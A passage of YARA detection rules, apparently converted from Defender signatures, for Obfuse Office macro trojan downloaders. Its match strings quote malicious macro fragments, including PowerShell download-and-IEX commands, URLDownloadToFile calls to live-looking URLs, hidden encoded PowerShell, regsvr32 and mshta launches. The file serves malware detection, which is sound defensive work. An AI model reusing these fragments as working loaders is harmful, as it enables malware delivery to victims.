        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell okvumygpihve(\"433a5c57696e646f77735c53797374656d33325c6d736874612e6578652068747470733a2f2f7777772e6d696e7069632e64652f6b2f6263646e2f706c\")" ascii //weight: 1
        $x_1_2 = "= okvumygpihve & Chr$(Val(\"&H\" & Mid$(utkblhgsefvf, szhtdbnlkflx, 2)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_66
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\\"\" & Char(80) & Char(82) & \"\"OGRAMDATA\\a.\"\"&CHAR(101)&\"\"xe" ascii //weight: 1
        $x_1_2 = "=CALL(\"\"ur\"\"&CHAR(108)&\"\"mon\"\",\"\"UR\"\"&CHAR(76)&\"\"Down\"\"&CHAR(108)&\"\"oadToFi\"\"&CHAR(108)" ascii //weight: 1
        $x_1_3 = "https://religonclothes.com/test2.exe" ascii //weight: 1
        $x_1_4 = "ExcelSheet.Run fackyou" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_67
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" ascii //weight: 1
        $x_1_2 = ".ExecQuery(\"SELECT * FROM Win32_NetworkAdapter\")" ascii //weight: 1
        $x_1_3 = "= Replace(ZYXMIYO.MACAddress, \":\", \"\")" ascii //weight: 1
        $x_1_4 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 41 74 74 61 63 68 65 64 54 65 6d 70 6c 61 74 65 20 3d 20 22 68 74 74 70 3a 2f 2f 77 6f 72 64 2d 6c 69 73 2e 6d 79 66 74 70 2e 6f 72 67 2f 22 20 2b 20 [0-16] 20 2b 20 22 2f 56 6d 68 65 56 66 71 47 78 47 58 2e 64 6f 74 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_68
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FilePath = \"C:\\temp\\payload.vbs\"" ascii //weight: 1
        $x_1_2 = "Set WinHttpReq = CreateObject(\"\"Microsoft.XMLHTTP\"\")" ascii //weight: 1
        $x_1_3 = "Set WshShell = WScript.CreateObject(\"\"WScript.Shell\"\")" ascii //weight: 1
        $x_1_4 = "WshShell.Run \"\"c:\\temp\\notewriter.exe\"\"\"" ascii //weight: 1
        $x_1_5 = "Shell \"wscript c:\\temp\\payload.vbs\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_69
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"aunaiduaisduhaisuhdaisuhdaisudhiashdiashdiaushdiaushdiuasdash==\"" ascii //weight: 1
        $x_1_2 = "= \"po\"" ascii //weight: 1
        $x_1_3 = "= \"wer\"" ascii //weight: 1
        $x_1_4 = "= \"ShE\"" ascii //weight: 1
        $x_1_5 = "= \"ll\"" ascii //weight: 1
        $x_1_6 = "+ \" -nop -wIn hiDdEn -ep bypass -enc \"" ascii //weight: 1
        $x_1_7 = "+ \"\" + ActiveDocument.BuiltInDocumentProperties(\"" ascii //weight: 1
        $x_1_8 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 ?? ?? 29 2e 52 75 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_70
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\" & Application.Version & \"\\Word\\Security\\AccessVBOM\"" ascii //weight: 1
        $x_1_2 = "= GetObject(\"\", \"word.application\")" ascii //weight: 1
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 22 6c 6c 65 68 73 2e 74 70 69 72 63 73 77 22 29 29 2e 52 65 67 57 72 69 74 65 28 [0-25] 2c 20 31 2c 20 22 52 45 47 5f 44 57 4f 52 44 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 69 64 28 [0-25] 2c 20 [0-25] 2c 20 31 30 30 30 30 30 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_71
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"https://kithuatphanmem.000webhostapp.com/chare/test.zip\"" ascii //weight: 1
        $x_1_2 = "SaveBinaryData \"C:\\Users\\\" & User & \"\\Documents\\test.zip\", objWinHttp.responseBody" ascii //weight: 1
        $x_1_3 = "oShell.Run \"cmd.exe /R cd C:\\Users\\\" & User & \"\\Documents\\Test\\netcoreapp3.1 && CookieVirus.exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_72
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".savetofile \"\"putty.vbs\"\", 2 \" & vbCrLf" ascii //weight: 1
        $x_1_2 = "objShell.Run (\"\"putty.vbs\"\")\" & vbCrLf" ascii //weight: 1
        $x_1_3 = "Set objWMIService = GetObject(\"\"winmgmts:\\\\\"\" & strComputer & \"\"\\root\\cimv2\"\")\" & vbCrLf" ascii //weight: 1
        $x_1_4 = ".FileExists(Environ(\"USERPROFILE\") + \"\\Documents\\\" + \"tLLsm4W2.txt\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_73
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fnaggmjylhu = \"cmd.exe /c\" & \"CmD cmraxlq\" & \" cmd \" & \"/r\" & _" ascii //weight: 1
        $x_1_2 = "b & c & \"wershell \" & \"(NEw-objE\" & lll & \"t \" & \"system.net.wEBclIenT).DownLoAdfIlE\" & \"" ascii //weight: 1
        $x_1_3 = "https://raw.githubusercontent.com/farao15/jj/master/fina.jpg" ascii //weight: 1
        $x_1_4 = "$ENv:TEMP\\qawsplsqfr.vbs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_74
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
        $x_1_2 = "= \"https://billboardonline.live/view.php\"" ascii //weight: 1
        $x_1_3 = ".savetofile VBA.Environ(\"LOCALAPPDATA\") & \"\\\" & RandomString & \".dll\", 2" ascii //weight: 1
        $x_1_4 = "Call Shell(\"regsvr32 \" & VBA.Environ(\"LOCALAPPDATA\") & \"\\\" & RandomString & \".dll\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_75
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "ActiveSheet.OLEObjects(1).Visible = b2996a70fa7414259115a178c0c7815aa" ascii //weight: 1
        $x_1_3 = "CreateObject(\"Shell.Application\").Namespace(Environ(\"LOCALAPPDATA\")).Self.InvokeVerb \"Paste\"" ascii //weight: 1
        $x_1_4 = ".Run Chr(34) & Environ(\"LOCALAPPDATA\") & \"\\nc.exe\" & Chr(34), 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_76
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"https://cdn-143.anonfiles.com/R2WbR1e6p6/136adbc8-1602535912/hi.vbs\"" ascii //weight: 1
        $x_1_2 = "Shell \"explorer.exe \" & Environ(\"userprofile\") & \"\\Desktop\\hi.vbs\"" ascii //weight: 1
        $x_1_3 = "WinHttpReq.Open \"GET\", myURL, False, \"username\", \"password\"" ascii //weight: 1
        $x_1_4 = "oStream.SaveToFile Environ(\"userprofile\") & \"\\Desktop\\hi.vbs\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_77
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"WinHttp.WinHttpRequest.5.1\")" ascii //weight: 1
        $x_1_2 = "http://192.168.0.103:4701/index.php?\" &" ascii //weight: 1
        $x_1_3 = ".SetTimeouts 5000, 5000, 5000, 5000" ascii //weight: 1
        $x_1_4 = "= System.OperatingSystem & \",\" & Application.Build & \",\" & Application.Version & \",\" & Application.UserName & \",\" & Environ$(\"computername\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_78
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Replace(bab, \">A<\", \"\")" ascii //weight: 1
        $x_1_2 = {28 22 3e 41 3c 43 72 3e 41 3c 65 61 3e 41 3c 74 65 3e 41 3c 4f 62 3e 41 3c 6a 65 3e 41 3c 63 74 3e 41 3c 28 22 29 20 26 20 [0-8] 28 33 34 29 20 26 20 4d 6f 6e 6b 65 79 73 28 22 3e 41 3c 57 53 3e 41 3c 63 72 3e 41 3c 69 70 3e 41 3c 74 2e 3e 41 3c 53 68 3e 41 3c 65 6c 3e 41 3c 6c 22 29 20 26 20 [0-8] 28 33 34 29 20 26 20 4d 6f 6e 6b 65 79 73 28 22 3e 41 3c 29 2e 3e 41 3c 52 75 3e 41 3c 6e 20 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= Monkeys(\"C>A<:\\U>A<ser>A<s\\\") & Environ(Monkeys(\"Us>A<er>A<na>A<me\")) & Monkeys(\"\\A>A<pp>A<Da>A<ta\\Lo>A<ca>A<l\\T>A<em>A<p\\wtphjgf.e>A<xe\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_79
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=CALL(\"\"urlmon\"\",\"\"URLDownl\" + aya1 +" ascii //weight: 1
        $x_1_2 = "= \"oadToFileA\"" ascii //weight: 1
        $x_1_3 = "h\"\"&CHAR(116)&CHAR(116)&CHAR(112)&\"\"s\"\"&CHAR(58)&CHAR(47)&CHAR(47)&\"\"tinyurl\"\"&CHAR(46)&\"\"com\"\"&CHAR(47)&\"\"yae39j5s" ascii //weight: 1
        $x_1_4 = "h\"\"&CHAR(116)&CHAR(116)&CHAR(112)&\"\"s\"\"&CHAR(58)&CHAR(47)&CHAR(47)&\"\"tinyurl\"\"&CHAR(46)&\"\"com\"\"&CHAR(47)&\"\"y7udqylm" ascii //weight: 1
        $x_1_5 = "=EX\" + \"E\" + \"C\" + \"(\"\"C:\\PROGRAMDATA\\a\"\"&CHAR(46)&\"\"ex\"\"&CHAR(101)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SM_2147755532_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SM!MTB"
        threat_id = "2147755532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ(\"USERPROFILE\")" ascii //weight: 1
        $x_1_2 = "= other & \"\\zx.exe\"" ascii //weight: 1
        $x_1_3 = "puts = Split(ouffer, \"&\")" ascii //weight: 1
        $x_1_4 = "CByte((\"&H\" & puts(info)) Xor &HFF)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SM_2147755532_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SM!MTB"
        threat_id = "2147755532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"ile('http://onedrivenet.xyz/work/30.vbs',\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(VxXtgRgWY(\"_[kzqx|6[pmtt\", \"8\"))" ascii //weight: 1
        $x_1_3 = {2e 52 75 6e 20 [0-37] 2c 20 76 62 48 69 64 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SM_2147755532_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SM!MTB"
        threat_id = "2147755532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(fuckzargus).Exec luli1 + luli2" ascii //weight: 1
        $x_1_2 = "yazeed9 = \"3\" + \"0\" + \"9\"" ascii //weight: 1
        $x_1_3 = "luli2 = yazeed9 + yazeed10 + yazeed12" ascii //weight: 1
        $x_1_4 = "yazeed10 = \"4\" + \"8\" + \"@\" + \"a" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SM_2147755532_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SM!MTB"
        threat_id = "2147755532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "= Environ(\"tmp\") & \"\\main.theme\"" ascii //weight: 2
        $x_1_2 = {46 6f 72 20 [0-48] 20 3d 20 31 20 54 6f 20 4c 65 6e 28 ?? ?? ?? ?? ?? ?? ?? ?? 29 20 53 74 65 70 20 33}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4d 69 64 28 ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_4 = {20 3d 20 53 74 72 43 6f 6e 76 28 ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 36 34 29}  //weight: 1, accuracy: Low
        $x_1_5 = {53 65 74 20 [0-48] 20 3d 20 4e 65 77 20 4d 53 58 4d 4c 32 2e 58 4d 4c 48 54 54 50 36 30}  //weight: 1, accuracy: Low
        $x_1_6 = {43 61 6c 6c 20 [0-48] 2e 4f 70 65 6e 28 22 47 45 54 22 2c 20 [0-48] 2c 20 46 61 6c 73 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SM_2147755532_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SM!MTB"
        threat_id = "2147755532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "U4 = \"c\" + \"m\" + \"d\"" ascii //weight: 1
        $x_1_2 = "u5 = \"msgbox/rm\" + \"sh\" + \"ta \"" ascii //weight: 1
        $x_1_3 = "ii = u5 + u6 + u7 + u8" ascii //weight: 1
        $x_1_4 = "coooo = ShellExecute _" ascii //weight: 1
        $x_1_5 = "u7 = \"y.com/asdodo\"" ascii //weight: 1
        $x_1_6 = "clock = \"OPEN\"  ' action might be OPEN, NEW or other, depending on what you need to do" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SM_2147755532_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SM!MTB"
        threat_id = "2147755532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "URLDownloadToFile 0, \"http://9nag0.com/unbbmevd/d76.php?l=oev2.cab\", Py, 0, 0" ascii //weight: 2
        $x_2_2 = "URLDownloadToFile 0, \"http://5u2mr.com/unbbmevd/d76.php?l=oev4.cab\", Ga, 0, 0" ascii //weight: 2
        $x_1_3 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 22 68 74 74 70 3a 2f 2f [0-7] 2e 63 6f 6d 2f 75 6e 62 62 6d 65 76 64 2f 64 37 36 2e 70 68 70 3f 6c 3d 6f 65 76 34 2e 63 61 62 22 2c 20 47 61 2c 20 30 2c 20 30}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_SM_2147755532_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SM!MTB"
        threat_id = "2147755532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "BrCWvooVNfiJmyjM" ascii //weight: 1
        $x_1_2 = "Sleep (127 Xor 1091)" ascii //weight: 1
        $x_1_3 = {53 65 74 20 [0-15] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 28 41 72 72 61 79 28 31 36 30 2c 20 28 28 30 20 58 6f 72 20 34 29 20 2b 20 38 29 2c 20 28 28 36 33 20 58 6f 72 20 31 32 32 29 20 2b 20 31 37 34 29 29 2c 20 30 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-16] 28 41 72 72 61 79 28 28 28 37 38 20 58 6f 72 20 33 33 29 20 2b 20 33 30 29 2c 20 31 34 2c 20 31 38 34 2c 20 28 28 31 32 20 58 6f 72 20 31 36 29 20 2b 20 28 30 20 58 6f 72 20 30 29 29 29 2c 20 28 28 32 20 58 6f 72 20 31 30 29 20 2b 20 28 31 32 20 58 6f 72 20 33 30 29 29 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = "Call Shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SM_2147755532_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SM!MTB"
        threat_id = "2147755532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set widraw = GetObject(ChrW(119) + ChrW(105) + ChrW(110) + ChrW(109) + ChrW(103) + ChrW(109) + ChrW(116) + ChrW(115) + ChrW(58) + ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) + ChrW(50) + ChrW(95)" ascii //weight: 1
        $x_1_2 = {73 74 72 4c 69 6e 65 20 3d 20 45 6e 76 69 72 6f 6e 24 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 2b 20 22 5c [0-54] 22}  //weight: 1, accuracy: Low
        $x_1_3 = "strLine2 = Environ$(ChrW(65) + ChrW(80) + ChrW(80) + ChrW(68) + ChrW(65) + ChrW(84) + ChrW(65)) + \"\\\" + Environ$(ComName) + \"\\\" + Environ$(ComName)" ascii //weight: 1
        $x_1_4 = ".create Right(ThisDocument.DefaultTargetFrame + \" -decode \", 17) + strLine + ChrW(46) + ChrW(120) + ChrW(108) + ChrW(115) + \" \" + strLine + \".dll" ascii //weight: 1
        $x_1_5 = ".create Right(\"cc85g78c89f799bcafb88a9eggebc6fag87rundll32 \", 9) + strLine & \".dll,EntryPoint\"," ascii //weight: 1
        $x_1_6 = {73 74 72 4c 69 6e 65 20 3d 20 45 6e 76 69 72 6f 6e 24 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 2b 20 22 5c [0-54] 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YA_2147755625_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YA!MTB"
        threat_id = "2147755625"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "^owershell.exe $Mo=@(" ascii //weight: 1
        $x_1_2 = {6d 69 7a 20 3d 20 52 65 70 6c 61 63 65 28 [0-18] 2c 20 22 5e 22 2c 20 22 50 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "obj1.Run s & miz" ascii //weight: 1
        $x_1_4 = "$t=[System.Text.Encoding]::ASCII.GetString($Mo)|IEX" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PM_2147755689_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PM!MTB"
        threat_id = "2147755689"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "powershell.exe \"\"IEX ((new-object net.webclient).downloadstring('https://drive.google.com/uc?id=1fxj2_ITnq1Yb6QbXw3HncRuwFAB8wN47&export=download" ascii //weight: 1
